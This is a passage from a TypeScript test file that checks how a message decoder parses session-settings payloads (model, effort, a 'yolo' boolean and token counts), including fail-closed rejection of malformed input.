  })

  it('decodes empty model/effort, yolo:false and zero usage as those values, never as absent', () => {
    const zeros = {
      session_id: 'sess-a',
      model: '',
      effort: '',
      yolo: false,
      used_tokens: 0,
      window_tokens: 0
    }
    expect(parseInboundMessage(encodeSessionSettings(zeros))).toEqual({
      kind: 'session-settings',
      sessionSettings: zeros,
      inReplyTo: 812
    })
  })

  it('drops unknown server keys, keeping only the six known fields (forward-compat)', () => {
    const withExtras = { ...RUN_CONFIG, conversation_id: 'conv-1', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeSessionSettings(withExtras))).toEqual({
      kind: 'session-settings',
      sessionSettings: RUN_CONFIG,
      inReplyTo: 812
    })
  })
})

describe('parseInboundMessage — session_settings fail-closed (#491)', () => {
  it('throws when any of the three string fields is missing or non-string', () => {
    const bad: unknown[] = [
      { ...RUN_CONFIG, session_id: undefined },
      { ...RUN_CONFIG, model: undefined },
      { ...RUN_CONFIG, effort: null },
      { ...RUN_CONFIG, session_id: 42 }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeSessionSettings(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when yolo is missing or non-boolean', () => {
    const bad: unknown[] = [
      { session_id: 's', model: 'm', effort: 'e', used_tokens: 0, window_tokens: 0 },
      { ...RUN_CONFIG, yolo: 'true' },
      { ...RUN_CONFIG, yolo: 1 }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeSessionSettings(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when either usage int is missing or non-number', () => {
    const bad: unknown[] = [
      { ...RUN_CONFIG, used_tokens: undefined },
      { ...RUN_CONFIG, window_tokens: '200000' }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeSessionSettings(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on a non-record payload', () => {
    for (const payload of [null, 42, 'nope', []]) {
      expect(() => parseInboundMessage(encodeSessionSettings(payload))).toThrow(WireDecodeError)
    }
  })
})
